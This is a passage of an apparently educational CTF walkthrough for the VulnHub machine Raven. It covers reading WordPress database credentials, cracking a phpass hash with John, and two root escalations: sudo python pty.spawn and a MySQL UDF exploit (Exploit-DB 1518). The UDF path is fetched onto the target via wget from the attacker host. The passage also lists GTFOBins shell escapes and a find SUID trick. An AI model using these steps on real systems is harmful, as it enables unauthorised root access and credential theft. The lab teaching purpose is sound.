> `~/.ssh/known_hosts` and will scream loudly if the key ever changes (which is
> how SSH detects man-in-the-middle attacks). In a lab you always type `yes`. On a
> real network a *changed* key is a genuine security event.
>
> **Notice the banner: `Debian 3.16.56`.** That confirms the OS fingerprint from
> nmap and gives you the exact kernel — 3.16 on Debian 8, released 2018, well
> inside the range of many public kernel exploits. Hold that thought for §4.5.
>
> **An SSH shell is a huge upgrade over a web shell**: full job control, working
> `Ctrl+C`, tab completion, and `sudo`/`su` prompts that actually function. Always
> convert to SSH the moment you have any valid credential.

```bash
michael@Raven:~$ cat /var/www/flag2.txt 2>/dev/null || find / -name "flag2*" 2>/dev/null
```

```text
flag2{it-should-be-in-/var/www}
```

> **Breaking that command down:**
> - `2>/dev/null` sends **stderr** (file descriptor 2) to the null device, so the
>   thousands of `Permission denied` messages from `find` do not bury the answer.
> - `||` means "run the right-hand side **only if** the left-hand side failed."
>   So: try the known path; if it is not there, search the whole filesystem.
>
> **Why this matters:** as a low-privilege user we can already read a flag left in
> a **web-accessible directory**. World-readable flags in `/var/www` is itself a
> misconfiguration — anything in the document root can be fetched by an anonymous
> visitor over HTTP, without any shell at all.

![SSH access as michael](images/04-foothold.png)

### The user flag(s)

```bash
michael@Raven:~$ find / -name "flag*.txt" 2>/dev/null
```

```text
/var/www/flag2.txt
```

```bash
michael@Raven:~$ cat /var/www/flag2.txt
```

```text
flag2{it-should-be-in-/var/www}
```

> **Where are flag1, flag3, flag4?** CTF flag placement is inconsistent across
> VulnHub, so know the conventions: `proof.txt` (the Metasploitable/OffSec
> tradition), `root.txt`/`user.txt` (HackTheBox), numbered `flagN.txt` scattered
> across the web root, home directories, `/root`, `/media`, and — as on this box —
> **inside database tables**. See §4.5 for the other three.
>
> **Deep dive:** [CONCEPTS §17 — Flags, proofs and CTF conventions](../../docs/CONCEPTS.md#17-flags-proofs-and-ctf-conventions)

![User flag](images/06-user-flag.png)

---

## 4. Privilege escalation

> ### 📖 Concept — What is privilege escalation?
>
> You have a shell as `michael`, an ordinary user. **Privilege escalation** is the
> process of becoming an administrator — `root` on Linux, `SYSTEM`/`Administrator`
> on Windows.
>
> Why bother? An ordinary user can read their own files and almost nothing else.
> Root can read every file, load kernel modules, change any password, and install
> a backdoor that survives a reboot. On a CTF the root flag can only be read by
> root; in a real engagement, root is the difference between "we found a weak
> password" and "the entire estate is compromised."
>
> **The discipline is a checklist, worked in order from cheapest to most
> destructive:**
>
> | Order | Check | Command |
> | --- | --- | --- |
> | 1 | **What may I already run as root?** | `sudo -l` ← *the single highest-value command* |
> | 2 | What files run as their owner regardless of who invokes them? | `find / -perm -u=s -type f 2>/dev/null` |
> | 3 | What extra privileges are attached to binaries? | `getcap -r / 2>/dev/null` |
> | 4 | What runs on a schedule, as root? | `cat /etc/crontab`, `pspy64` |
> | 5 | What root-owned file can I write to? | `find / -writable -type f 2>/dev/null` |
> | 6 | Can I read a credential that gets reused? | `wp-config.php`, `.env`, `.bash_history` |
> | 7 | Is the kernel old enough to exploit? | `uname -a` + `searchsploit` |
> | 8 | Am I in a privileged group? | `id` → `docker`, `lxd`, `disk`, `sudo` |
>
> **Work it in order.** Steps 1–5 take minutes and are safe. Step 7 (kernel
> exploits) can panic the VM and cost you a re-import, so it is last resort, not
> first instinct.
>
> **Deep dive:** [CONCEPTS §15 — Linux privilege escalation](../../docs/CONCEPTS.md#15-linux-privilege-escalation)

### 4.0 Run the checklist

Before anything clever, run the standard sweep:

```bash
michael@Raven:~$ id
```

```text
uid=1000(michael) gid=1000(michael) groups=1000(michael),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),108(netdev)
```

> **Read the group list.** `docker`, `lxd`, `libvirt` or `disk` would be an
> instant root. `sudo`, `wheel` or `adm` would be very interesting. Here there are
> only hardware-access groups (`cdrom`, `audio`, `video`) — nothing exploitable.
> That is a *useful negative result*: it rules out an entire escalation class in
> one line.

```bash
michael@Raven:~$ sudo -l
```

```text
[sudo] password for michael:
Sorry, user michael may not run sudo on Raven.
```

```bash
michael@Raven:~$ find / -perm -u=s -type f 2>/dev/null
```

```text
/bin/mount
/bin/ping
/bin/su
/bin/umount
/usr/bin/chfn
/usr/bin/chsh
/usr/bin/newgrp
/usr/bin/gpasswd
/usr/bin/passwd
/usr/lib/eject/dmcrypt-get-device
/usr/lib/openssh/ssh-keysign
/usr/lib/pt_chown
/usr/sbin/exim4
```

> All stock Debian 8 — **nothing to abuse.** Learn this baseline so that the odd
> entries (`cp`, `wget`, `python`, `find`, `nano`, `vim`, `tail`) jump out
> instantly on boxes that have them. Cross-reference anything unusual against
> **[GTFOBins](https://gtfobins.github.io/)**, which documents exactly which
> binaries can be abused when SUID or sudo-able.
>
> (`/usr/sbin/exim4` is worth a note: Exim versions around 4.87–4.91 have local
> root exploits, but Debian 8's packaged build here is not vulnerable. Checking
> and ruling out is still the right instinct.)

```bash
michael@Raven:~$ getcap -r / 2>/dev/null
michael@Raven:~$ cat /etc/crontab
```

```text
# /etc/crontab: system-wide crontab
SHELL=/bin/sh
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin

# m h dom mon dow user	command
17 *	* * *	root	cd / && run-parts --report /etc/cron.hourly
25 6	* * *	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
47 6	* * 7	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
52 6	1 * *	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
```

> `getcap` returns nothing — no unusual **file capabilities**. `/etc/crontab`
> contains only Debian's standard maintenance jobs, no custom script. Two more
> escalation classes eliminated.
>
> **So `michael` has no direct path to root.** That is the cue to stop looking at
> *michael* and start looking at what michael can **read**. The next section finds
> a credential that belongs to something far more privileged.

### 4.1 Read the database credentials

```bash
michael@Raven:~$ cat /var/www/html/wordpress/wp-config.php
```

```php
<?php
/**
 * The base configuration for WordPress
 */

// ** MySQL settings - You can get this info from your web host ** //
/** The name of the database for WordPress */
define('DB_NAME', 'wordpress');

/** MySQL database username */
define('DB_USER', 'root');

/** MySQL database password */
define('DB_PASSWORD', 'R@v3nSecurity');

/** MySQL hostname */
define('DB_HOST', 'localhost');

/** Database Charset to use in creating database tables. */
define('DB_CHARSET', 'utf8');

/** The Database Collate type. Don't change this if in doubt. */
define('DB_COLLATE', '');

/**#@+
 * Authentication Unique Keys and Salts.
 */
define('AUTH_KEY',         'put your unique phrase here');
define('SECURE_AUTH_KEY',  'put your unique phrase here');
...
$table_prefix  = 'wp_';

/** For developers: WordPress debugging mode. */
define('WP_DEBUG', false);

/* That's all, stop editing! Happy blogging. */

/** Absolute path to the WordPress directory. */
if ( !defined('ABSPATH') )
	define('ABSPATH', dirname(__FILE__) . '/');

/** Sets up WordPress vars and included files. */
require_once(ABSPATH . 'wp-settings.php');
```

> ### 📖 Concept — Why is this file such a big deal?
>
> `wp-config.php` is the **first file WordPress loads**. It must contain the
> database credentials, because PHP needs them to connect on every single page
> request. There is no way to avoid that — a web application has to know how to
> reach its database.
>
> So the file is, by necessity, **plaintext secrets sitting in the web root**.
> Three things follow:
>
> 1. **Any user who can read the web root has the database password.** `michael`
>    can, so we do.
> 2. **Any Local File Inclusion vulnerability anywhere on the site leaks it.** On
>    other boxes you never get a shell first — you read `wp-config.php` through an
>    LFI and go straight to the database.
> 3. **A backup of it is a jackpot.** `wp-config.php.bak`, `wp-config.bak`,
>    `wp-config.php~`, `.wp-config.php.swp` — all served as *text* rather than
>    executed, so a misconfigured server hands them over HTTP. `wpscan -e cb`
>    looks for exactly these.
>
> **The real finding here is not the file — it is `DB_USER = 'root'`.** WordPress
> should connect with a dedicated least-privilege account (`wordpress_user`) that
> can only `SELECT`/`INSERT`/`UPDATE`/`DELETE` on its own database. Instead this
> site talks to MySQL **as the database superuser**. That single decision is what
> turns "read a config file" into "execute commands as root on the operating
> system", in §4.4.
>
> The equivalent files on other stacks, all worth hunting for:
>
> | Stack | File |
> | --- | --- |
> | WordPress | `wp-config.php` |
> | Joomla | `configuration.php` |
> | Laravel | `.env` |
> | Django | `settings.py` |
> | Rails | `config/database.yml`, `config/master.key` |
> | .NET | `web.config` |
> | Node | `.env`, `config.json` |

### 4.2 Dump users, crack a hash

```bash
michael@Raven:~$ mysql -u root -p -h 127.0.0.1
```

```text
Enter password: R@v3nSecurity
Welcome to the MySQL monitor.  Commands end with ; or \g.
Your MySQL connection id is 43
Server version: 5.5.60-0+deb8u1 (Debian)

Copyright (c) 2000, 2018, Oracle and/or its affiliates. All rights reserved.

Oracle is a registered trademark of Oracle Corporation and/or its
affiliates. Other names may be trademarks of their respective
owners.

Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.

mysql>
```

> **Note `-h 127.0.0.1` rather than `-h localhost`.** In MySQL these are *not* the
> same: `localhost` connects over a **Unix socket** (`/var/run/mysqld/mysqld.sock`)
> and `127.0.0.1` connects over **TCP**. Depending on how the server's `skip-name-resolve`
> and grant tables are set up, one may work and the other may not. If you get
> `ERROR 2002 (HY000): Can't connect to local MySQL server through socket`, switch
> to the TCP form.
>
> Also notice: **MySQL is listening on loopback only.** An external `nmap` scan of
> this box never reported port 3306 — because it is not reachable from outside.
> That is why post-exploitation enumeration uses `ss -tulnp` from *inside*: it
> reveals an entire attack surface the network scan could not see.

```sql
mysql> show databases;
```

```text
+--------------------+
| Database           |
+--------------------+
| information_schema |
| mysql              |
| performance_schema |
| wordpress          |
+--------------------+
4 rows in set (0.00 sec)
```

```sql
mysql> use wordpress;
Database changed
mysql> show tables;
```

```text
+-----------------------+
| Tables_in_wordpress   |
+-----------------------+
| wp_commentmeta        |
| wp_comments           |
| wp_links              |
| wp_options            |
| wp_postmeta           |
| wp_posts              |
| wp_term_relationships |
| wp_term_taxonomy      |
| wp_termmeta           |
| wp_terms              |
| wp_usermeta           |
| wp_users              |
+-----------------------+
12 rows in set (0.00 sec)
```

```sql
mysql> select ID,user_login,user_pass,user_email from wp_users;
```

```text
+----+------------+------------------------------------+------------------------+
| ID | user_login | user_pass                          | user_email             |
+----+------------+------------------------------------+------------------------+
|  1 | michael    | $P$BjRvZQ.VQcGZlDeiKToCQd.cPw5XCe0 | michael@raven.local    |
|  2 | steven     | $P$Bk3VD9jsxx/loJoqNsURgHiaB23j7W/  | steven@raven.local     |
+----+------------+------------------------------------+------------------------+
2 rows in set (0.00 sec)
```

> ### 📖 Concept — What is a password hash, and why can't we just read it?
>
> A well-built system never stores your password. It stores a **hash** — the
> output of a one-way mathematical function. When you log in, it hashes what you
> typed and compares the *hashes*. Matching hashes means matching passwords.
>
> **One-way** means you cannot run the function backwards. There is no
> "un-hash". Given `$P$Bk3VD9jsxx/loJoqNsURgHiaB23j7W/` you cannot compute
> `pink84` — you can only *guess* candidates, hash each one, and compare.
>
> **So "cracking" a hash is a guessing game, and speed is everything.** The
> defence is to make each guess expensive.
>
> **Recognising the format by its prefix:**
>
> | Prefix | Algorithm | Speed on a modern GPU |
> | --- | --- | --- |
> | *(32 hex chars)* | MD5 | **Billions/sec** — unusable for passwords |
> | *(40 hex chars)* | SHA-1 | Billions/sec |
> | `$1$` | MD5-crypt | ~100k/sec |
> | `$2a$` / `$2b$` / `$2y$` | **bcrypt** | ~20k/sec |
> | `$6$` | SHA-512-crypt (older Linux default) | ~10k/sec |
> | **`$P$` / `$H$`** | **phpass** — WordPress, Drupal, phpBB | ~5k/sec |
> | `$y$` | yescrypt (Ubuntu 22.04+ default) | ~3k/sec |
>
> **These are `$P$` — phpass**, WordPress's own scheme. It is deliberately slow:
> it runs **8192 rounds of MD5** per guess, with the iteration count encoded in the
> fourth character. That is not accidental; it is the whole point. But 8192 MD5
> rounds is slow by 2018 standards and trivially parallelisable on a GPU, so a
> password that appears in `rockyou.txt` still falls quickly.
>
> **The anatomy of a phpass hash:**
>
> ```text
> $P$Bk3VD9jsxx/loJoqNsURgHiaB23j7W/
> │ ││└──────────── 8-char salt + 22-char hash ────────────┘
> │ │└── iteration count: 'B' → log2(8192) rounds
> │ └─── phpass identifier
> └───── format marker
> ```
>
> **Deep dive:** [CONCEPTS §10 — Encoding vs hashing vs encryption](../../docs/CONCEPTS.md#10-encoding-vs-hashing-vs-encryption) and
> [§14 — Password cracking](../../docs/CONCEPTS.md#14-password-cracking)

Save steven's hash and crack it offline:

```bash
michael@Raven:~$ echo '$P$Bk3VD9jsxx/loJoqNsURgHiaB23j7W/' > /tmp/hash.txt
michael@Raven:~$ cat /tmp/hash.txt
```

```text
$P$Bk3VD9jsxx/loJoqNsURgHiaB23j7W/
```

> ⚠️ **Single quotes are essential here.** In *double* quotes or unquoted, the
> shell would try to interpret `$P`, `$B` and `$k3VD9…` as variable expansions and
> silently produce an empty or truncated string. **Always single-quote hashes.**
> This is one of the most common reasons a crack "finds nothing".

Copy the file to Kali (or retype it) and run John:

```bash
# Kali
john --wordlist=/usr/share/wordlists/rockyou.txt --format=phpass hash.txt
```

```text
Using default input encoding: UTF-8
Loaded 1 password hash (phpass, PHPass [MD5 256/256 AVX2 8x3])
Will run 8 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
pink84           (?)
1g 0:00:00:14 DONE (2024-05-11 15:52) 0.0704g/s 3842p/s 3842c/s 3842C/s pinky1..pineapple1
Use the "--show" option to display all of the cracked passwords reliably
Session completed
```

> **How to read John's output:**
> - `Loaded 1 password hash (phpass, PHPass [MD5 256/256 AVX2 8x3])` — John
>   **auto-detected** the format correctly as phpass, and reports it is using AVX2
>   vector instructions across 8 threads. If it ever says
>   `No password hashes loaded`, the format guess failed — pass `--format=`
>   explicitly. `john --list=formats` lists every format it knows.
> - `pink84 (?)` — **the cracked password**, with `?` because we supplied a bare
>   hash with no username attached.
> - `1g 0:00:00:14 DONE` — 1 guess succeeded, in 14 seconds.
> - `0.0704g/s 3842p/s` — the rate: 3,842 password candidates hashed per second.
>   **That low number is phpass's defence working.** Compare an MD5 hash, which
>   cracks at millions per second.
>
> Re-run later with `john --show hash.txt` to display results without re-cracking.
>
> **If the wordlist had failed**, the next escalation is *rules* — automatic
> mangling that capitalises, appends digits and applies leetspeak:
>
> ```bash
> john --wordlist=rockyou.txt --rules --format=phpass hash.txt
> # or with hashcat:
> hashcat -m 400 -a 0 hash.txt rockyou.txt -r /usr/share/hashcat/rules/best64.rule
> ```
>
> `best64.rule` applies 64 common transformations per word. A list that fails
> outright very often succeeds with rules at 64× the cost — **try it before giving
> up.**

![Privesc — cracking the WordPress hash](images/07-privesc.png)

### 4.3 Root path A — `sudo python` (GTFOBins)

`steven` is a *local* account as well as a WordPress one. Switch to him with the
cracked password:

```bash
michael@Raven:~$ su steven
Password: pink84
steven@Raven:/home/michael$ cd ~
steven@Raven:~$ pwd
/home/steven
```

> `su` (*substitute user*) switches accounts inside your current session. It needs
> a real **TTY** — which is why an unupgraded web shell will fail here with
> `standard input must be a tty`. Our SSH session is fine.

Now the highest-value command in Linux privilege escalation:

```bash
steven@Raven:~$ sudo -l
```

```text
Matching Defaults entries for steven on raven:
    env_reset, mail_badpass, secure_path=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin

User steven may run the following commands on raven:
    (ALL) NOPASSWD: /usr/bin/python
```

> ### 📖 Concept — What is `sudo`, and how do you read this output?
>
> **`sudo`** ("superuser do") runs a command **as another user** — by default, as
> root. It exists so administrators can grant *specific* elevated abilities
> without handing out the root password. Its rules live in `/etc/sudoers` (edited
> only via `visudo`).
>
> `sudo -l` (**l**ist) shows what *you* are permitted. **It is the first command
> to run as any new user on any box**, because it costs nothing and a surprising
> fraction of machines are solved by one line of its output.
>
> **Parse this line token by token:**
>
> | Token | Meaning |
> | --- | --- |
> | `(ALL)` | May run as **any** user — including root |
> | `NOPASSWD:` | **No password will be requested.** You do not need to know steven's password to escalate. |
> | `/usr/bin/python` | Only this one binary, and it must be exactly this **absolute path** |
>
> Other shapes you will meet, and what they mean:
>
> ```text
> (ALL : ALL) ALL                      → full root, no restriction at all
> (root) NOPASSWD: /usr/bin/find       → only as root, only find
> (ALL) NOPASSWD: /usr/bin/python *    → python with ANY arguments  ← dangerous
> (ALL) NOPASSWD: /usr/bin/python -m * → only with -m as first arg
> (fred) NOPASSWD: /bin/cp             → run as fred only, not root
> ```
>
> **Why `/usr/bin/python` is fatal here.** Python is a general-purpose
> interpreter. Its entire purpose is to run arbitrary code. Granting it with
> `(ALL) NOPASSWD:` is *logically identical* to granting a root shell — you just
> have to type the shell part yourself. This class of mistake is so common that
> there is a dedicated reference for it:
>
> **[GTFOBins](https://gtfobins.github.io/)** documents which ordinary Unix
> binaries can be abused to escalate privileges when they are SUID, sudo-able, or
> invoked by a scheduler. It is organised by *capability* — shell, file read, file
> write, reverse shell, SUID, sudo.
>
> **Do not invent payloads.** When you find a sudo or SUID binary, look it up. It
> is maintained, tested, and explains *why* each line works. The Windows
> equivalent is **LOLBAS** (<https://lolbas-project.github.io/>).
>
> Binaries that can execute other programs are always dangerous in sudoers:
> `python`, `perl`, `ruby`, `lua`, `node`, `php`, `bash`, `sh`, `find`, `vim`,
> `nano`, `less`, `more`, `man`, `awk`, `env`, `gdb`, `nmap`, `tar`, `zip`,
> `make`, `git`, `ftp`, `watch`.
>
> **Deep dive:** [CONCEPTS §15.2 — sudo rights](../../docs/CONCEPTS.md#152-sudo-rights)

Apply the GTFOBins recipe:

```bash
steven@Raven:~$ sudo python -c 'import pty; pty.spawn("/bin/bash")'
```

```text
root@Raven:/home/steven#
```

The prompt changed from `steven@Raven:~$` to `root@Raven:/home/steven#`. Confirm:

```bash
root@Raven:/home/steven# id
uid=0(root) gid=0(root) groups=0(root)
root@Raven:/home/steven# whoami
root
root@Raven:/home/steven# hostname
Raven
```

> ### 📖 Concept — Exactly why that produced root
>
> Follow the chain of trust:
>
> 1. `sudo` consults `/etc/sudoers`, finds `(ALL) NOPASSWD: /usr/bin/python`, and
>    therefore launches **`/usr/bin/python` with an effective UID of 0**.
> 2. The `-c '…'` argument tells Python to execute the string as a program rather
>    than reading a file. **`sudo` has no idea what that program does** — it
>    authorised the *binary*, not the *behaviour*. This is the fundamental flaw in
>    unrestricted sudo entries for interpreters.
> 3. `import pty` loads Python's **pseudo-terminal** module. `pty.spawn("/bin/bash")`
>    forks a `bash` process attached to a newly allocated pty.
> 4. A child process **inherits its parent's effective UID**. The parent is a
>    root-owned Python, so the child bash is root.
>
> **Why `pty.spawn` rather than `os.system('/bin/bash')`?** Both give root, but
> `os.system` does not allocate a terminal, so you get a shell where `Ctrl+C`
> kills your session, tab completion does not work, and interactive programs fail.
> `pty.spawn` gives you a **proper TTY**. Use it every time.
>
> Any of these work equivalently — the point is that Python can reach a shell:
>
> ```bash
> sudo python -c 'import os; os.system("/bin/bash")'
> sudo python -c 'import pty; pty.spawn("/bin/sh")'
> sudo python3 -c 'import pty; pty.spawn("/bin/bash")'
> ```
>
> **Generalise this.** The pattern is not "python is dangerous." It is: ***any*
> program that can execute another program, granted without argument
> restrictions, is a root shell.** The same is true of `perl -e 'exec "/bin/sh"'`,
> `ruby -e 'exec "/bin/sh"'`, `lua -e 'os.execute("/bin/sh")"'`, `find . -exec
> /bin/sh \;`, `vim -c ':!sh'`, and `less` followed by `!sh`.

```bash
root@Raven:~# cd /root && ls -la
total 32
drwx------  2 root root 4096 Aug 14  2018 .
drwxr-xr-x 22 root root 4096 Aug 14  2018 ..
-rw-r--r--  1 root root  570 Jan 31  2010 .bashrc
-rw-r--r--  1 root root  140 Nov 19  2007 .profile
-rw-r--r--  1 root root  219 Aug 14  2018 flag4.txt
root@Raven:~# cat flag4.txt
```

```text
______
| ___ \
| |_/ /__ ___   _____ _ __
|    // _` \ \ / / _ \ '_ \
| |\ \ (_| |\ V /  __/ | | |
\_| \_\__,_| \_/ \___|_| |_|


Congratulations on successfully rooting Raven!

flag4{b1f3a4c9d2e8471a90c5f3e7d6b2a8c1}
```

**Root path A complete.** ✅

### 4.4 Root path B — MySQL UDF (the "intended" second way)

Path A is trivial once you see it. Path B is more involved, but it teaches a
genuinely important mechanism: **how a database server that runs as root becomes
an operating-system root shell.**

> ### 📖 Concept — What is a MySQL UDF?
>
> **UDF** = *User Defined Function*. MySQL lets you extend its SQL language by
> loading a **shared library** (a `.so` file on Linux, a `.dll` on Windows) that
> exports functions written in C. Once registered with
> `CREATE FUNCTION … SONAME '…'`, you can call them inside ordinary SQL:
>
> ```sql
> SELECT my_function('argument');
> ```
>
> That is a legitimate feature, used for custom math or string handling. The
> security consequence is this: **if the library's function calls the C standard
> library's `system()`, then your SQL query executes an operating-system command.**
> And because the `mysqld` process itself runs as **root** on this box, so does
> that command.
>
> The classic exploit libraries are `raptor_udf.c` and `raptor_udf2.c`
> (Exploit-DB **1518**), which export a function named **`do_system`**. Some
> variants export `sys_eval` or `sys_exec` instead.
>
> **Three preconditions must all hold** — check each one, because if any fails the
> attack does not:
>
> | Precondition | How to check |
> | --- | --- |
> | MySQL runs as **root** (or another privileged user) | `ps aux \| grep mysqld` |
> | You have MySQL credentials with `FILE` privilege and `INSERT` rights | `SELECT @@version; SHOW GRANTS;` |
> | The **plugin directory is writable** by the MySQL user | `SELECT @@plugin_dir;` then `ls -ld` it |
>
> Modern MySQL defends against this with **`secure_file_priv`**, which restricts
> where `LOAD_FILE()` and `INTO DUMPFILE` may read and write. Check it:
>
> ```sql
> SHOW VARIABLES LIKE 'secure_file_priv';
> ```
>
> If it returns a directory, you are confined to it. If it returns `NULL`, file
> operations are disabled entirely. On this box it is empty, so the attack works.

Confirm the preconditions first:

```bash
root@Raven:~# ps aux | grep mysqld | grep -v grep
```

```text
root      2214  0.1  4.2 558432 43212 ?        Sl   Aug14   1:12 /usr/sbin/mysqld --basedir=/usr --datadir=/var/lib/mysql --plugin-dir=/usr/lib/mysql/plugin --user=root --log-error=/var/log/mysql/error.log --pid-file=/var/run/mysqld/mysqld.pid --socket=/var/run/mysqld/mysqld.sock --port=3306
```

> **`--user=root`** — precondition 1 confirmed. This is itself the misconfiguration:
> a database server should run as a dedicated `mysql` service account, which is
> exactly what Debian's packaging normally does. Someone started this one as root.
> Note also `--plugin-dir=/usr/lib/mysql/plugin` — that is where our library must
> land.

Build the UDF library on Kali:

```bash
# Kali
searchsploit -m 1518.c
```

```text
  Exploit: MySQL 4/5/6 - UDF for Command Execution
      URL: https://www.exploit-db.com/exploits/1518
     Path: /usr/share/exploitdb/exploits/linux/local/1518.c
    Codes: CVE-2007-0001, OSVDB-34803
 Verified: True
File Type: C program, ASCII text
Copied to: 1518.c
```

> **`searchsploit`** is a **local, offline** search of the Exploit-DB archive
> shipped with Kali. Offline matters — it works mid-engagement with no internet.
>
> | Flag | Meaning |
> | --- | --- |
> | *(no flag)* | Search titles and paths |
> | `-t` | Search **titles only** — far fewer false positives |
> | `-m <path>` | **M**irror (copy) the exploit into your current directory |
> | `-x <path>` | E**x**amine (print) it to the terminal |
> | `-p <id>` | Show the full **path** for an ID |
>
> **Read the exploit before you run it.** Non-negotiable, for three reasons: (1)
> many Exploit-DB entries are *unverified* and some are outright malicious to the
> person running them; (2) you need to know which parameters to change; (3)
> understanding it is the entire point of the exercise. `searchsploit -x 1518.c`.

```bash
# Kali — compile it into a shared object
gcc -g -shared -Wl,-soname,1518.so -o 1518.so 1518.c -lc
```

> **What these compiler flags mean:**
>
> | Flag | Purpose |
> | --- | --- |
> | `-g` | Include debug symbols (harmless here, useful when a build fails) |
> | **`-shared`** | Produce a **shared library** (`.so`) instead of an executable. This is what MySQL can `dlopen()`. |
> | `-Wl,-soname,1518.so` | Pass `-soname 1518.so` to the **l**inker, embedding the library's own name. MySQL checks this matches. |
> | `-o 1518.so` | Output filename — **must** end in `.so` and must match the `SONAME` you will register |
> | `-lc` | Link against **libc**, which is where `system()` lives |
>
> Verify it built correctly:
>
> ```bash
> file 1518.so && nm -D 1518.so | grep -i do_system
> ```
>
> ```text
> 1518.so: ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked, not stripped
> 0000000000000000 T do_system
> ```
>
> `T do_system` means the symbol is **exported and defined in the text (code)
> section**. Without that line, the `CREATE FUNCTION` in a moment will fail with
> `Can't find function 'do_system' in library`.
>
> **Architecture must match the target.** Both are x86-64 here. If the target were
> 32-bit you would need `gcc -m32`, and a mismatched `.so` fails to load with a
> confusing error.

Serve it to the target:

```bash
# Kali
python3 -m http.server 80
```

```text
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
192.168.56.101 - - [11/May/2024 16:05:12] "GET /1518.so HTTP/1.1" 200 -
```

```bash
# target
root@Raven:~# cd /tmp
root@Raven:/tmp# wget http://192.168.56.10/1518.so
```

```text
--2024-05-11 16:05:12--  http://192.168.56.10/1518.so
Connecting to 192.168.56.10:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 14112 (14K) [application/octet-stream]
Saving to: '1518.so'

1518.so               100%[===========================>]  13.78K  --.-KB/s    in 0s

2024-05-11 16:05:12 (142 MB/s) - '1518.so' saved [14112/14112]
```

> `python3 -m http.server 80` turns your current directory into a web server —
> the standard way to move files onto a target that has `wget` or `curl` but no
> `scp`. Port 80 needs root; use `8000` otherwise and adjust the URL.
> **The log line above is diagnostic gold:** if your shell never arrives, the first
> question is always *"did the target even fetch the file?"*

Now the MySQL side. Reconnect as root:

```bash
root@Raven:/tmp# mysql -u root -p'R@v3nSecurity'
```

```sql
mysql> SHOW VARIABLES LIKE 'secure_file_priv';
```

```text
+------------------+-------+
| Variable_name    | Value |
+------------------+-------+
| secure_file_priv |       |
+------------------+-------+
1 row in set (0.00 sec)
```

> **Empty value = no restriction.** `LOAD_FILE()` and `INTO DUMPFILE` may read and
> write anywhere the `mysqld` process can — and it runs as root, so that is
> everywhere. Had this shown a path, we would be confined to it; had it shown
> `NULL`, file operations would be disabled and this whole path would be dead.

```sql
mysql> use mysql;
Database changed
mysql> create table foo(line blob);
Query OK, 0 rows affected (0.01 sec)

mysql> insert into foo values(load_file('/tmp/1518.so'));
Query OK, 1 row affected (0.00 sec)

mysql> select * from foo into dumpfile '/usr/lib/mysql/plugin/1518.so';
Query OK, 1 row affected (0.00 sec)

mysql> create function do_system returns integer soname '1518.so';
Query OK, 0 rows affected (0.00 sec)
```

> ### 📖 Concept — What those four statements do
>
> This is the part that looks like magic and is actually very mechanical. MySQL has
> no "upload a file" command, so the exploit **launders the binary through the
> database**:
>
> | Statement | What it does |
> | --- | --- |
> | `create table foo(line blob)` | Makes a scratch table with one column of type **`blob`** — *binary large object*, the only SQL type that stores arbitrary bytes without character-set mangling. |
> | `insert into foo values(load_file('/tmp/1518.so'))` | **`LOAD_FILE()`** reads the `.so` off disk and inserts its **raw bytes** into the table. Requires the `FILE` privilege and an unrestricted `secure_file_priv`. |
> | `select * from foo into dumpfile '/usr/lib/mysql/plugin/1518.so'` | **`INTO DUMPFILE`** writes those bytes back out to a path of our choosing. Because `mysqld` runs as **root**, it can write into `/usr/lib/mysql/plugin/` — a directory no normal user may touch. |
> | `create function do_system returns integer soname '1518.so'` | Registers the exported `do_system` symbol as a **SQL function**, loading the library from the plugin directory. |
>
> **The key insight is the round trip:** *file → table → file in a privileged
> location*. It converts "I can read a file as root" into "I can write a file as
> root", and writing into the plugin directory is what makes code execution
> possible.
>
> Note `dumpfile` and not `outfile`. `INTO OUTFILE` adds row terminators and
> escapes newlines, which would corrupt a binary. `INTO DUMPFILE` writes **exactly**
> the bytes, with no formatting — mandatory for a `.so`.
>
> If `create function` fails with `Can't open shared library`, the usual causes
> are: wrong architecture, a missing `-soname`, the file did not land in
> `@@plugin_dir`, or `secure_file_priv` blocked the write. Diagnose with:
>
> ```sql
> SELECT @@plugin_dir, @@version, @@secure_file_priv;
> ```

Now use it — and note *what we choose to do* with it:

```sql
mysql> select do_system('id > /tmp/proof.txt');
```

```text
+----------------------------------+
| do_system('id > /tmp/proof.txt') |
+----------------------------------+
|                                0 |
+----------------------------------+
1 row in set (0.01 sec)
```

```sql
mysql> select do_system('cat /tmp/proof.txt');
+---------------------------------+
| do_system('cat /tmp/proof.txt') |
+---------------------------------+
|                               0 |
+---------------------------------+
```

```bash
root@Raven:/tmp# cat /tmp/proof.txt
uid=0(root) gid=0(root) groups=0(root)
```

> **`0` is the exit status, not the output.** `do_system` returns the command's
> exit code; `0` means success. The command's *stdout* is discarded, because SQL
> has nowhere to put it. That is why we redirect to a file and then read the file —
> the standard technique for any **blind** command execution.

The published walkthrough instead makes a SUID binary. Either works:

```sql
mysql> select do_system('chmod u+s /usr/bin/find');
```

```text
+-----------------------------------------+
| do_system('chmod u+s /usr/bin/find')    |
+-----------------------------------------+
|                                       0 |
+-----------------------------------------+
```

> ### 📖 Concept — What is SUID, and why does `chmod u+s` on `find` mean root?
>
> **SUID** (*set-user-ID*) is a file permission bit that makes a program run with
> the privileges of the **file's owner** instead of the caller. It exists for a
> good reason: `/usr/bin/passwd` is SUID-root so that ordinary users can change
> their own password, which requires writing `/etc/shadow` — a file they cannot
> otherwise touch.
>
> **When a *powerful* binary carries the SUID bit, that power becomes yours.**
>
> `chmod u+s` sets it. In a listing you read it as an **`s`** where the owner's
> execute bit would be:
>
> ```text
> -rwxr-xr-x  →  -rwsr-xr-x      (SUID set)
>       ^            ^
> ```
>
> `find` is fatal because of its `-exec` action, which **runs an arbitrary command
> for each file it matches**. Combined with SUID-root:
>
> ```bash
> cd /tmp
> touch raj                                  # create a file to match
> find raj -exec "whoami" \;                 # → root
> find raj -exec "/bin/sh" \;                # → root shell
> ```
>
> **The `\;` needs escaping.** `find` must receive a literal `;` as its own
> argument; an unescaped `;` would be eaten by the shell as a command separator.
> `\;` or `';'` both work.
>
> **Find SUID binaries yourself — this is a top-three privesc command:**
